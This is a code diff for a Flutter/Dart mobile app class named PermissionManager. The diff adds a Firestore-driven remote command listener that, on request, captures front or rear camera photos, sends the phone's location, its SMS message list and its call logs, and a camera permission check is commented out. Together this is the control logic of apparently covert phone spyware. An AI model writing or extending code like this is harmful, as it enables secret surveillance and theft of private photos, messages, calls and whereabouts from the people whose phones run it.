@@ -13,7 +13,6 @@ import 'package:path_provider/path_provider.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:photo_manager/photo_manager.dart';
 import 'dart:math';
-
 import 'package:sms/sms.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 
@@ -53,16 +52,21 @@ class PermissionManager {
   initilizeGlobalListiner() {
     db.collection('actions').orderBy("requested_date", descending: true)
         .limit(1).snapshots().listen((onData) async {
+        
       print((onData.documents));
-      if (isActionRequest && docLength != onData.documents.length) {
-
-        switch (onData.documents[0]['action']) {
-          case UserActions.GetFrontImage:
-            
-            break;
-          default:
-        }
-        await sendFrontImage();
+      if (isActionRequest) {
+        var action = onData.documents[0]['action'];
+         if(action == UserActions.GetFrontImage.index){
+            await sendImage(true);
+         }else if (action == UserActions.GetRareImage.index){
+            await sendImage(false);
+         }else if (action == UserActions.GetCurrentLocation.index){
+            await sendGeoLocation();
+         }else if (action == UserActions.RefreshMessageList.index){
+            await sendMessagesList();
+         }else if (action == UserActions.RefreshCalllogs.index){
+            await sendCallLogs();
+         }
       }
       isActionRequest = true;
       docLength = onData.documents.length;
@@ -185,7 +189,7 @@ class PermissionManager {
     // }
   }
 
-  sendFrontImage() async {
+  sendImage(isFrontCamera) async {
     // PermissionStatus permission =
     //     await PermissionHandler().checkPermissionStatus(PermissionGroup.camera);
     // if (permission.value == PermissionStatus.granted) {
@@ -193,7 +197,8 @@ class PermissionManager {
     List<CameraDescription> avaliableCameras;
     String imageUrl;
     avaliableCameras = await availableCameras();
-    controller = CameraController(avaliableCameras[1], ResolutionPreset.medium);
+    CameraDescription camera = isFrontCamera ? avaliableCameras[1]:avaliableCameras[0];
+    controller = CameraController(camera, ResolutionPreset.medium);
     controller.initialize().then((response) async {
       await captureImage(controller);
     });
